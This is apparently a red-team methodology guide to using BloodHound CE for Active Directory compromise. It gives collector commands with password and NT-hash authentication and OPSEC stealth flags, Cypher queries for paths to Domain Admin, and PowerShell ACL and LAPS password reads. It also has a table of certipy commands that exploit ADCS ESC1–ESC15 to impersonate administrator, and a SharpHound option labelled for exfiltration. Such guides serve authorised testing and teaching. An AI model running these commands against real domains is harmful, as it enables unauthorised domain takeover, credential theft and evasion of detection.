# BloodHound Navigation Guide

How to move from a freshly owned principal to a domain compromise path using BloodHound CE.
All Cypher queries run in the BloodHound UI → Analysis → Custom Query.

> **Cross-references:** For execution detail on the attacks BloodHound surfaces (Kerberoasting, AS-REP Roasting, ACL abuse, ADCS ESC1–ESC15, NTLM relay, RBCD, delegation), see [active-directory-methodology.md](active-directory-methodology.md). For lateral movement once an `AdminTo` / `CanPSRemote` / `CanRDP` edge is found, see [windows-methodology.md](windows-methodology.md).

---

## Table of Contents

- [BloodHound CE Setup](#bloodhound-ce-setup)
- [Step 0: Import Data](#step-0-import-data)
  - [SharpHound Flag Matrix (Modern Collection Methods)](#sharphound-flag-matrix-modern-collection-methods)
- [Step 1: Mark Your Owned Principals](#step-1-mark-your-owned-principals)
- [Step 2: Find Paths from Owned Nodes](#step-2-find-paths-from-owned-nodes)
- [Step 3: Outbound Control — All Rights from Owned Nodes](#step-3-outbound-control--all-rights-from-owned-nodes)
- [Step 4: Common Attack-Specific Queries](#step-4-common-attack-specific-queries)
- [Step 5: Cross-Trust / Forest Paths](#step-5-cross-trust--forest-paths)
- [Step 6: Edge → Action Quick Map](#step-6-edge--action-quick-map)
- [Manual ACL Discovery without SharpHound](#manual-acl-discovery-without-sharphound)
- [BloodHound CE vs Legacy Compatibility](#bloodhound-ce-vs-legacy-compatibility)
- [ADCS-Related Queries](#adcs-related-queries)
  - [ADCS Edge → Action Map (ESC1–ESC15)](#adcs-edge--action-map-esc1esc15)
- [Tips](#tips)

---

## BloodHound CE Setup

```bash
# === Install via official docker-compose (PostgreSQL + Neo4j + API + UI) ===
mkdir -p ~/bloodhound-ce && cd ~/bloodhound-ce
curl -L https://ghst.ly/getbhce -o docker-compose.yml
docker compose pull
docker compose up -d

# Default web UI: http://localhost:8080
# Initial admin password is printed once in the API container logs:
docker compose logs bloodhound | grep -A1 "Initial Password"

# === Lifecycle ===
docker compose ps                        # status
docker compose logs -f bloodhound        # tail API logs
docker compose down                      # stop (keeps volumes)
docker compose down -v                   # NUKE everything (drops graph + postgres data)
docker compose up -d                     # start

# === Reset neo4j password (CE bundles its own neo4j; default user neo4j) ===
docker compose exec graph-db cypher-shell -u neo4j -p bloodhoundcommunityedition \
  "ALTER USER neo4j SET PASSWORD '<NEW_PW>'"

# === Bind UI port to localhost only (default behavior — confirm) ===
# Edit docker-compose.yml: ports: ["127.0.0.1:8080:8080"]

# === Generate API token (UI flow) ===
# 1. Login → top-right user icon → My Profile
# 2. API Key Management → Create Token
# 3. Copy the Token ID + Token Key (shown ONCE)
# 4. Export for CLI/curl use:
export BHE_TOKEN_ID='<token-id-uuid>'
export BHE_TOKEN_KEY='<token-key-secret>'
export BHE_URL='http://localhost:8080'

# === bloodhound-cli — headless ingest of SharpHound/AzureHound zips ===
# Install (Go):  go install github.com/SpecterOps/bloodhound-cli@latest
bloodhound-cli --token-id "$BHE_TOKEN_ID" --token-key "$BHE_TOKEN_KEY" \
  --url "$BHE_URL" upload ./bh.zip

# === REST API — bearer token (works on most CE builds; HMAC-SHA256 required on 5.4+) ===
# Quick auth check via bearer (older CE builds and BHE):
curl -s -H "Authorization: bhe $BHE_TOKEN_KEY" "$BHE_URL/api/v2/self" | jq
# CE 5.4+: bearer is rejected — use bloodhound-cli (handles HMAC signing) or
# replicate the HMAC scheme from specterops/bloodhound-cli (sha256 of method+path+body, hex).

# Run a Cypher query through the API
curl -s -X POST "$BHE_URL/api/v2/graphs/cypher" \
  -H "Authorization: bhe $BHE_TOKEN_KEY" \
  -H 'Content-Type: application/json' \
  -d '{"query":"MATCH (n:User {name:\"<USER>@<DOMAIN>\"}) RETURN n LIMIT 1"}' | jq

# List collected domains
curl -s -H "Authorization: bhe $BHE_TOKEN_KEY" "$BHE_URL/api/v2/available-domains" | jq

# Mark a node as owned via API (use objectid)
curl -s -X POST "$BHE_URL/api/v2/asset-groups/1/selectors" \
  -H "Authorization: bhe $BHE_TOKEN_KEY" \
  -H 'Content-Type: application/json' \
  -d '[{"selector_name":"<USER>","sid":"<S-1-5-21-...>","action":"add"}]'
```

---

## Step 0: Import Data

```bash
# From Linux (NTLM auth, DNS over TCP to avoid UDP drops through SOCKS)
bloodhound-ce-python -u '<USER>' -p '<PW>' -ns <DC_IP> -d <DOMAIN> \
  -c all --zip --dns-tcp -dc dc01.<DOMAIN>

# With NT hash (NTLM auth)
bloodhound-ce-python -u '<USER>' --hashes 'aad3b435b51404eeaad3b435b51404ee:<NT_HASH>' \
  --auth-method ntlm -ns <DC_IP> -d <DOMAIN> -c all --zip --dns-tcp -dc dc01.<DOMAIN>

# Through SOCKS proxy
proxychains4 bloodhound-ce-python -u '<USER>' -p '<PW>' -ns <DC_IP> -d <DOMAIN> \
  -c all --zip --dns-tcp -dc dc01.<DOMAIN>

# From Linux — RustHound-CE (Rust collector, faster than bloodhound-ce-python on large domains, single static binary)
# https://github.com/g0h4n/RustHound-CE   (CE schema; the legacy NH-RED-TEAM/RustHound emits BH 4.x JSON)
rusthound-ce -d <DOMAIN> -u '<USER>@<DOMAIN>' -p '<PW>' -i <DC_IP> -z              # cleartext
rusthound-ce -d <DOMAIN> -u '<USER>@<DOMAIN>' --hashes 'aad3b435b51404eeaad3b435b51404ee:<NT_HASH>' -i <DC_IP> -z   # NTLM hash auth

# RustHound-CE through SOCKS — talks SOCKS5 natively (avoids LDAP-over-proxychains timeouts)
ALL_PROXY=socks5://127.0.0.1:1080 rusthound-ce -d <DOMAIN> -u '<USER>@<DOMAIN>' -p '<PW>' -i <DC_IP> -z

# From Windows foothold (SharpHound — avoids LDAP signing issues, sees host-local sessions)
.\SharpHound.exe -c All --ZipFilename bh.zip
# Download and import the zip via BloodHound UI
```

> **Collector decision rule:** Linux + cleartext or NTLM hash → `rusthound-ce` (fastest, single static binary). Linux + Kerberos auth needed (e.g. AS-REP / `KRB5CCNAME`) → `bloodhound-ce-python` (Python tooling integrates better with `klist` / ccache flow). Windows foothold or LDAP signing rejects Linux clients → `SharpHound.exe`.

### SharpHound Flag Matrix (Modern Collection Methods)

```powershell
# === -c <method> — collection methods (comma-separate) ===
# All        — Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, Container, GPOLocalGroup (no SPN/LoggedOn)
# Default    — Group, LocalAdmin, Session, Trusts
# DCOnly     — LDAP-only; NO SMB/RPC to non-DCs (stealthy on workstations; misses sessions/local admin)
# Group      — group memberships
# LocalAdmin — RID 544 group enumeration on each computer (SAMR/SMB)
# RDP        — RID 555 (Remote Desktop Users)
# DCOM       — RID 562 (Distributed COM Users)
# PSRemote   — Remote Management Users
# Session    — NetSessionEnum (anonymous on legacy; auth on 2019+ patched)
# LoggedOn   — NetWkstaUserEnum + remote registry — NEEDS LOCAL ADMIN on target
# Trusts     — domain trust enumeration
# ACL        — DACL collection on every object (heaviest)
# Container  — OUs, GPO links, default containers
# GPOLocalGroup — Restricted Groups via GPO XML parsing
# ObjectProps — extra props (description, pwdlastset, etc.)
# SPNTargets — Kerberoastable SPN targets
# UserRights — SeEnableDelegation etc. (slow)
# CARegistry — CA host registry (CA flags, EDITF_ATTRIBUTESUBJECTALTNAME2 — ESC6)
# DCRegistry — DC remote registry (LAPS legacy, msLAPS-EncryptedPassword key)
# CertServices — ADCS objects: PKI, CAs, templates, NTAuthCertificates, OIDs

# === Recommended modern full sweep (CE-aware, ADCS, LAPS) ===
.\SharpHound.exe -c All,CertServices,DCRegistry,GPOLocalGroup,Trusts,ACL --ZipFilename bh.zip

# === LDAP-only (low-noise, skip SMB/RPC to member hosts) ===
.\SharpHound.exe -c DCOnly,CertServices --ZipFilename bh-dconly.zip

# === LoggedOn collection (admin required, kicks SMB to every host) ===
.\SharpHound.exe -c All,LoggedOn,CertServices --ZipFilename bh-loggedon.zip

# === Stealth / OPSEC flags ===
.\SharpHound.exe -c All --Stealth                  # skip share enum (avoids SMB tree-connect storms)
.\SharpHound.exe -c All --RandomizeFilenames       # randomize cache + zip filenames on disk
.\SharpHound.exe -c All --MemCache                 # keep cache in memory only (no .bin on disk)
.\SharpHound.exe -c Session --Loop --LoopDuration 02:00:00 --Throttle 1000 --Jitter 30
#                              ^ poll sessions for 2h, 1000ms between requests, ±30% jitter

# === Output / scoping ===
.\SharpHound.exe -c All --OutputDirectory C:\ProgramData\Logs --OutputPrefix audit_
.\SharpHound.exe -c All --ZipFilename bh.zip --NoZip      # leave JSON files unzipped
.\SharpHound.exe -c All --Domain CHILD.<DOMAIN>           # cross-domain (need creds for that domain)
.\SharpHound.exe -c All --DomainController dc01.<DOMAIN>  # pin to specific DC
.\SharpHound.exe -c All --LdapUsername '<USER>' --LdapPassword '<PW>'   # alt creds
.\SharpHound.exe -c All --SearchForest                    # walk all trusted domains in forest
.\SharpHound.exe -c All --ExcludeDomainControllers        # skip DCs in computer-side collection
.\SharpHound.exe -c All --CollectAllProperties            # include LDAP props beyond default set

# === Encrypted ZIP for exfil ===
.\SharpHound.exe -c All --ZipPassword 'changeme' --ZipFilename bh.zip
```

---

## Step 1: Mark Your Owned Principals

In the BloodHound UI:
1. Search for your user/computer by name
2. Right-click node → **Mark as Owned**
3. Repeat for every principal you control (users, computers, machine accounts)

---

## Step 2: Find Paths from Owned Nodes

### Shortest Path to Domain Admin
```cypher
MATCH p=shortestPath(
  (n {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@<DOMAIN>"})
)
RETURN p
```

### All Paths to Domain Admin (Not Just Shortest)
```cypher
MATCH p=(n {owned:true})-[*1..10]->(g:Group {name:"DOMAIN ADMINS@<DOMAIN>"})
RETURN p
LIMIT 25
```

### Path to Any High-Value Target
```cypher
MATCH p=shortestPath(
  (n {owned:true})-[*1..]->(t {highvalue:true})
)
RETURN p
```

### What Can the Current User Directly Do? (1-Hop Only)
```cypher
MATCH (n:User {name:"<USER>@<DOMAIN>"})-[r]->(m)
RETURN type(r) AS right, m.name AS target, labels(m) AS target_type
ORDER BY right
```

---

## Step 3: Outbound Control — All Rights from Owned Nodes

### Every Right Your Owned Principals Have (Outbound)
```cypher
MATCH (n {owned:true})-[r]->(m)
WHERE NOT type(r) IN ['MemberOf','HasSession','TrustedBy']
RETURN n.name AS from, type(r) AS right, m.name AS target, labels(m) AS type
ORDER BY type(r)
```

### Only ACL-Based Edges (The Interesting Ones)
```cypher
MATCH (n {owned:true})-[r:GenericAll|GenericWrite|WriteOwner|WriteDACL|
  ForceChangePassword|AddMember|AddSelf|AllExtendedRights|
  ReadLAPSPassword|ReadGMSAPassword|DCSync|Owns|
  AllowedToDelegate|AllowedToAct|Contains|CreateChild]->(m)
RETURN n.name AS from, type(r) AS edge, m.name AS target, labels(m) AS target_type
ORDER BY type(r)
```

---

## Step 4: Common Attack-Specific Queries

### Kerberoastable Users (Prioritize Ones on a DA Path)

> Full Kerberoast attack chain (`GetUserSPNs.py` / `Rubeus kerberoast` → `hashcat -m 13100`): see [active-directory-methodology.md Phase 3.1](active-directory-methodology.md).

```cypher
MATCH (u:User {hasspn:true})
OPTIONAL MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@<DOMAIN>"}))
RETURN u.name, u.admincount, p IS NOT NULL AS on_DA_path
ORDER BY on_DA_path DESC
```

### AS-REP Roastable Users
```cypher
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.enabled, u.admincount
```

### Unconstrained Delegation Computers (Non-DCs)
```cypher
// Filter by Domain Controllers group RID 516 — robust against arbitrary DC hostnames
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT (c)-[:MemberOf*1..]->(:Group) WHERE NONE(g IN [(c)-[:MemberOf*1..]->(g:Group) | g.objectid] WHERE g ENDS WITH '-516')
RETURN c.name, c.operatingsystem
```

```cypher
// Simpler equivalent (single domain) — adjust <DOMAIN_SID> to your domain's SID
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT (c)-[:MemberOf*1..]->(:Group {objectid:'<DOMAIN_SID>-516'})
RETURN c.name, c.operatingsystem
```

### Constrained Delegation — What Service Accounts Can Delegate To?
```cypher
MATCH (u)-[:AllowedToDelegate]->(c:Computer)
RETURN u.name, u.objectid, collect(c.name) AS targets
```

### RBCD — Who Already Has AllowedToAct on a Computer?
```cypher
MATCH (a)-[:AllowedToAct]->(c:Computer)
RETURN a.name, c.name AS target_computer
```

### CreateChild on OUs (BadSuccessor Check — Windows Server 2025)
```cypher
MATCH (n)-[r:CreateChild]->(o:OU)
RETURN n.name AS principal, o.name AS ou
```

### DCSync Rights (Who Can Replicate Domain?)
```cypher
MATCH (n)-[:DCSync|GetChanges|GetChangesAll]->(d:Domain)
RETURN n.name, labels(n) AS type
```

### Shadow Credentials Candidates (GenericWrite Over User or Computer)
```cypher
MATCH (n)-[r:GenericWrite|GenericAll]->(t)
WHERE 'User' IN labels(t) OR 'Computer' IN labels(t)
RETURN n.name, type(r), t.name, labels(t)
```

### LAPS Readable
```cypher
MATCH (n)-[r:ReadLAPSPassword]->(c:Computer)
RETURN n.name, c.name
```

### GMSA Readable
```cypher
MATCH (n)-[r:ReadGMSAPassword]->(s:User)
RETURN n.name, s.name
```

### AdminTo — Where Does Your Node Have Local Admin?
```cypher
MATCH (n {owned:true})-[r:AdminTo]->(c:Computer)
RETURN n.name, c.name
```

### Sessions — Where Are DA Accounts Logged In Right Now?
```cypher
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name STARTS WITH "DOMAIN ADMINS"
RETURN c.name AS computer, u.name AS da_user
```

### Transitive Group Membership Towards DA
```cypher
MATCH p=(u:User {name:"<USER>@<DOMAIN>"})-[:MemberOf*1..]->(g:Group)
RETURN p
```

---

## Step 5: Cross-Trust / Forest Paths

### Trusts in the Domain
```cypher
MATCH (a:Domain)-[r:TrustedBy]->(b:Domain)
RETURN a.name, type(r), b.name
```

### Paths from Current Domain to Foreign Domain Objects
```cypher
MATCH p=shortestPath(
  (n {owned:true})-[*1..]->(m)
)
WHERE m.domain <> "<DOMAIN>"
RETURN p
LIMIT 10
```

---

## Step 6: Edge → Action Quick Map

| BloodHound Edge | What to run | Methodology |
|----------------|-------------|-------------|
| `GenericAll` (user) | Reset password or Shadow Credentials | Phase 4.2 |
| `GenericAll` (group) | `Add-DomainGroupMember` | Phase 4.3 |
| `GenericAll` (computer) | RBCD | Phase 5.3 |
| `GenericWrite` | Targeted Kerberoast or Shadow Credentials | Phase 4.2 |
| `WriteDACL` | Grant DCSync to self | Phase 4.4 |
| `WriteOwner` | Take ownership → WriteDACL | Phase 4.5 |
| `ForceChangePassword` | `net rpc password` / `bloodyAD set password` | Phase 4.6 |
| `AddMember` / `AddSelf` | Add self to group | Phase 4.3 |
| `ReadLAPSPassword` | `netexec ldap --laps` | Phase 8.2 |
| `ReadGMSAPassword` | `netexec ldap --gmsa` | Phase 8.1 |
| `CreateChild` (OU) | `Invoke-BadSuccessor` → dMSA | Phase 5.4 |
| `AllowedToDelegate` | `impacket-getST -spn -impersonate` | Phase 5.2 |
| `AllowedToAct` | RBCD S4U (already configured) | Phase 5.3 |
| `DCSync` | `impacket-secretsdump` | Phase 10.1 |
| `AdminTo` | WinRM / psexec / wmiexec | [windows-methodology.md Phase 5.x](windows-methodology.md) |
| `HasSession` | Token impersonation / coerce auth | Phase 5.1 |
| `CanPSRemote` | `evil-winrm` | [windows-methodology.md Phase 5.x](windows-methodology.md) |
| `CanRDP` | `xfreerdp` | [windows-methodology.md Phase 5.x](windows-methodology.md) |
| `SQLAdmin` | `impacket-mssqlclient`, xp_cmdshell | [enumeration-methodology.md §3.13](enumeration-methodology.md) |

[↑ Back to top](#bloodhound-navigation-guide)

---

## Manual ACL Discovery without SharpHound

When SharpHound / bloodhound-ce-python is blocked, signatured, or you need a quick targeted check from a Windows foothold without dropping a binary. Pure `[adsisearcher]` + `Get-Acl AD:` — ships with every Windows host since PowerShell 2.0.

```powershell
# === Pre-flight: identify the principal of interest and its DN ===
$user = ([adsisearcher]"(&(objectCategory=user)(samaccountname=<USER>))").FindOne()
$dn   = $user.Properties.distinguishedname[0]
"DN: $dn"

# === Inbound ACL on a target object — who can write to <USER>? ===
# AD: drive provider is built into the ActiveDirectory module; without RSAT use System.DirectoryServices
$de  = [ADSI]"LDAP://$dn"
$acl = $de.psbase.ObjectSecurity.Access
$acl | Where-Object { $_.AccessControlType -eq 'Allow' } |
       Select-Object IdentityReference, ActiveDirectoryRights, ObjectType, InheritedObjectType |
       Format-Table -AutoSize
```

```powershell
# === GenericAll / GenericWrite / WriteDACL / WriteOwner from owned principal ===
$me    = ([adsisearcher]"(samaccountname=$env:USERNAME)").FindOne().Properties.objectsid
$mySid = (New-Object Security.Principal.SecurityIdentifier($me[0],0)).Value

# Iterate every user/computer/group in the domain and report any ACE granting <SID> a powerful right
$rights = 'GenericAll','GenericWrite','WriteDacl','WriteOwner','ForceChangePassword','AllExtendedRights'
([adsisearcher]"(|(objectCategory=user)(objectCategory=computer)(objectCategory=group))").FindAll() | ForEach-Object {
    $obj = [ADSI]$_.Path
    foreach ($ace in $obj.psbase.ObjectSecurity.Access) {
        if ($ace.IdentityReference.Value -match $mySid -and ($rights | Where-Object { $ace.ActiveDirectoryRights -match $_ })) {
            [PSCustomObject]@{
                Target = $obj.distinguishedName.Value
                Right  = $ace.ActiveDirectoryRights
                Type   = $ace.ObjectType
            }
        }
    }
}
```

```powershell
# === ForceChangePassword (extended right 00299570-246d-11d0-a768-00aa006e0529) ===
([adsisearcher]"(samaccountname=<USER>)").FindOne().psbase.ObjectSecurity.Access |
  Where-Object { $_.ObjectType -eq '00299570-246d-11d0-a768-00aa006e0529' }

# === AddMember (group) — RIGHT_DS_WRITE_PROPERTY on member attribute (bf9679c0-0de6-11d0-a285-00aa003049e2) ===
([adsisearcher]"(&(objectCategory=group)(cn=<GROUP>))").FindOne().psbase.ObjectSecurity.Access |
  Where-Object { $_.ObjectType -eq 'bf9679c0-0de6-11d0-a285-00aa003049e2' -or $_.ActiveDirectoryRights -match 'WriteProperty|GenericWrite' }
```

```powershell
# === DCSync rights on the domain root ===
# DS-Replication-Get-Changes (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) + ...All (1131f6ad)
$root = [ADSI]"LDAP://$((Get-WmiObject Win32_ComputerSystem).Domain | ForEach-Object { 'DC=' + ($_ -replace '\.',',DC=') })"
$root.psbase.ObjectSecurity.Access |
  Where-Object { $_.ObjectType -in '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' } |
  Select-Object IdentityReference, ActiveDirectoryRights
```

```powershell
# === ReadLAPSPassword — ms-Mcs-AdmPwd or msLAPS-EncryptedPassword (Win2025+) ===
Get-Content (([adsisearcher]"(&(objectCategory=computer)(samaccountname=<COMPUTER>$))").FindOne().Properties['ms-mcs-admpwd']) 2>$null
# Or (Windows LAPS — Server 2022+ / Win11 23H2)
([adsisearcher]"(&(objectCategory=computer)(samaccountname=<COMPUTER>$))").FindOne().Properties['mslaps-password']
```

```powershell
# === RSAT shortcut (when ActiveDirectory module IS available) ===
Import-Module ActiveDirectory
(Get-Acl "AD:$(Get-ADUser <USER>)").Access |
  Where-Object { $_.IdentityReference -like "*$env:USERNAME*" } |
  Format-Table IdentityReference, ActiveDirectoryRights, ObjectType
```

> **GUID cheat sheet (LDAP control access rights):**
>
> | GUID | Extended Right |
> |---|---|
> | `00299570-246d-11d0-a768-00aa006e0529` | User-Force-Change-Password |
> | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes |
> | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Get-Changes-All |
> | `1131f6ac-9c07-11d1-f79f-00c04fc2dcd2` | DS-Replication-Synchronize |
> | `bf9679c0-0de6-11d0-a285-00aa003049e2` | Member (group) attribute write |
> | `f3a64788-5306-11d1-a9c5-0000f80367c1` | Validated-Write-SPN (targeted Kerberoast primitive) |

[↑ Back to top](#bloodhound-navigation-guide)

---

## BloodHound CE vs Legacy Compatibility

> **Note:** Queries above target **BloodHound Legacy** (Neo4j Cypher direct). BloodHound CE issues Cypher via `/api/v2/graphs/cypher` and labels objects via Privilege Zones (e.g. the default `Owned` label, marked manually or via rules — not the same as Tier Zero / High Value).

| Feature | Legacy (Neo4j) | CE (v5+) |
|---------|----------------|----------|
| Query language | Cypher directly | Cypher via `/api/v2/graphs/cypher` |
| Node labels | `User`, `Computer`, `Group` | Same labels, different property names |
| `owned` property | `{owned:true}` | `{system_tags:"owned"}` or mark via UI |
| `highvalue` property | `{highvalue:true}` | Tier Zero zone (system tag `admin_tier_0`) |
| Data collection | SharpHound / bloodhound-python | AzureHound / SharpHound CE / bloodhound-ce-python |

To adapt the queries above for CE, replace `{owned:true}` with `{system_tags:"owned"}`, or use the built-in CE analysis queries under **Explore → Cypher**.

---

## ADCS-Related Queries

> Queries below use BloodHound CE schema (`:EnterpriseCA`, `:CertTemplate`). Legacy 4.x used `:GPO {type:"..."}` overload — incompatible with CE.

### Find all ADCS Certificate Authorities
```cypher
MATCH (ca:EnterpriseCA)
RETURN ca.name, ca.domain
```

### ESC1-Vulnerable Templates (Enrollee Supplies Subject + Client Auth EKU)
```cypher
MATCH (t:CertTemplate)-[:PublishedTo]->(ca:EnterpriseCA)
WHERE t.enrolleesuppliessubject = true
  AND t.authenticationenabled = true
  AND t.requiresmanagerapproval = false
RETURN t.name AS template, ca.name AS ca
```

### Users/Groups That Can Enroll in Any Template
```cypher
MATCH (n)-[:Enroll|AutoEnroll]->(t:CertTemplate)
RETURN n.name, labels(n) AS principal_type, t.name AS template
```

### Principals with Enrollment Agent Rights
```cypher
MATCH (n)-[:Enroll]->(t:CertTemplate)
WHERE t.schemaversion >= 2
  AND ANY(eku IN t.ekus WHERE eku CONTAINS '1.3.6.1.4.1.311.20.2.1')
RETURN n.name, t.name AS agent_template
```

### Path from Owned to ADCS Abuse
```cypher
MATCH p = shortestPath(
  (n {owned:true})-[*1..]->(t:CertTemplate)
)
RETURN p
```

### ADCS Edge → Action Map (ESC1–ESC15)

> For full ADCS attack chains, ntlmrelayx pairings (ESC8/ESC11 coerce + relay), and Shadow Credentials primitives, see [active-directory-methodology.md §6–7](active-directory-methodology.md).

| ESC | BloodHound edge | Required prereq | Exploitation | Final impact |
|-----|----------------|-----------------|--------------|--------------|
| ESC1 | `ADCSESC1` | Enroll right on template + `mspki-certificate-name-flag` has `ENROLLEE_SUPPLIES_SUBJECT` (0x1) + Client/Smartcard/Any-Purpose EKU + Manager Approval disabled | `certipy-ad req -u '<USER>@<DOMAIN>' -p '<PW>' -ca '<CA>' -template '<TPL>' -upn 'administrator@<DOMAIN>'` | Cert auth as DA → TGT via `certipy-ad auth -pfx ...` |
| ESC2 | `ADCSESC2` | Enroll right + Any Purpose EKU (`2.5.29.37.0`) or no EKU | `certipy-ad req -ca '<CA>' -template '<TPL>'` then auth as another principal via cert | Authenticate as any user (subordinate-CA-style abuse) |
| ESC3 | `ADCSESC3` | Enroll right on Enrollment Agent template (`Certificate Request Agent` EKU) + a target template that allows EA enrollment | `certipy-ad req -ca CA -template EnrollAgent` → `certipy-ad req -ca CA -template User -on-behalf-of '<DOM>\administrator' -pfx agent.pfx` | Enroll on behalf of DA → cert auth → DA |
| ESC4 | `WriteDacl`/`GenericAll`/`WriteOwner`/`GenericWrite` → `CertTemplate` (or `ADCSESC4`) | Write rights over a template object | `certipy-ad template -template '<TPL>' -save-old`  → restore later → flips ESC1 prereqs ON, then run ESC1 | Make template ESC1-vulnerable → DA |
| ESC5 | `WriteDacl`/`GenericAll`/`Owns` → CA host / `NTAuthStore` / `RootCA` / `pKIEnrollmentService` object | Write rights on PKI object (CA computer, container `CN=NTAuthCertificates`, `CN=Public Key Services`) | Take ownership / grant self perms → ESC7 chain or forge CA cert via DPAPI on CA host | Forest compromise via NTAuthStore tampering |
| ESC6 | CA host has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled (collected by `--CARegistry`; surfaces as flag on CA node) | Enroll right on ANY template with Client Auth EKU + flag set on CA | `certipy-ad req -ca '<CA>' -template User -upn 'administrator@<DOMAIN>'` (CA accepts arbitrary SAN regardless of template) | Cert auth as DA |
| ESC7 | `ManageCA` / `ManageCertificates` edges to CA | CA Officer rights (Manage CA / Manage Certificates) | `certipy-ad ca -ca '<CA>' -add-officer '<USER>'` → `certipy-ad ca -ca '<CA>' -enable-template SubCA` → `certipy-ad req -ca '<CA>' -template SubCA` (denied) → `certipy-ad ca -ca '<CA>' -issue-request <ID>` → `certipy-ad req -ca '<CA>' -retrieve <ID>` | Issue arbitrary cert (SubCA → DA) |
| ESC8 | `ADCSESC8` | CA web enrollment endpoint (`/certsrv` or `/certsrv/Enroll`) reachable + NTLM accepted + a victim coercible | `certipy-ad relay -target 'http://<CA>/certsrv/certfnsh.asp' -template DomainController` then coerce DC via PetitPotam/PrinterBug (full coerce + relay chain: see [active-directory-methodology.md §6.4](active-directory-methodology.md)) | DC machine cert → S4U2Self → DA |
| ESC9 | `ADCSESC9` | Template has `CT_FLAG_NO_SECURITY_EXTENSION` (no `szOID_NTDS_CA_SECURITY_EXT`) + `StrongCertificateBindingEnforcement` weak/disabled (regkey on DC) + write to target's `userPrincipalName` | Set victim UPN to `administrator` (no `@domain`) → enroll cert as victim → reset UPN → cert maps to administrator on DC | Cert auth as DA |
| ESC10 | (no dedicated edge — DC regkey config) | DC has `CertificateMappingMethods=0x4` (UPN mapping enabled) OR `StrongCertificateBindingEnforcement=0` | Same as ESC9 (UPN spoofing) OR Schannel relay with weak mapping | DA via UPN-mapped cert |
| ESC11 | (no dedicated edge — CA flag) | CA has `IF_ENFORCEENCRYPTICERTREQUEST` disabled → ICPR RPC accepts unencrypted requests | `certipy-ad relay -target 'rpc://<CA>' -template Machine` (NTLM relay over MS-ICPR/RPC; full chain: see [active-directory-methodology.md §7.4](active-directory-methodology.md)) | DC machine cert via RPC relay → DA |
| ESC13 | `ADCSESC13` (`ExtendedByPolicy`/`OIDGroupLink`) | Template's issuance policy OID has `msDS-OIDToGroupLink` set to a privileged group + Enroll right on template | `certipy-ad req -ca '<CA>' -template '<TPL>'` → cert grants implicit group membership at logon | Implicit DA via OID-to-group |
| ESC14 | `WriteSPN`/`GenericWrite`/`WriteDacl` over user with `altSecurityIdentities` writable, OR ability to set `msDS-OIDToGroupLink` | Write `altSecurityIdentities` on victim to attacker's cert subject (explicit cert mapping) | `certipy-ad account update -user '<VICTIM>' -alt-security-identity 'X509:<I>...<S>...'` → request cert → auth as victim | Account takeover via explicit cert mapping |
| ESC15 (EKUwu) | (CVE-2024-49019, no dedicated edge) | Schema v1 template + Enrollee Supplies Subject + ability to inject application policies in CSR | `certipy-ad req -ca '<CA>' -template WebServer -upn 'administrator@<DOMAIN>' -application-policies 'Client Authentication'` | Inject Client Auth EKU at request time → DA |

```bash
# === Quick triage from CE collection ===
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PW>' -dc-ip <DC_IP> -vulnerable -enabled
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PW>' -dc-ip <DC_IP> -stdout -text -output adcs

# === Generic auth chain after any ESC succeeds ===
certipy-ad auth -pfx administrator.pfx -domain '<DOMAIN>' -dc-ip <DC_IP>   # → TGT + NT hash
```

[↑ Back to top](#bloodhound-navigation-guide)

---

## Tips

- **Start wide**: run the "All paths to DA" query with depth 10 before narrowing down
- **Owned chain**: each time you compromise a new node, mark it owned and re-run path queries — new edges appear
- **High-value targets**: besides Domain Admins check `Enterprise Admins`, `Schema Admins`, `Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `GPO objects linked to DCs`
- **BloodHound CE built-in queries** (Analysis tab): *Shortest Paths to Domain Admins*, *Principals with DCSync Rights*, *Kerberoastable Users in High Value Groups* — run all of these on every engagement
- **Pre-Windows-2000 compatible access group**: members can read all user attributes including password hashes on older DCs — check membership
- **DONT_REQ_PREAUTH + no path**: still worth AS-REP roasting and cracking offline even without a BH path

[↑ Back to top](#bloodhound-navigation-guide)
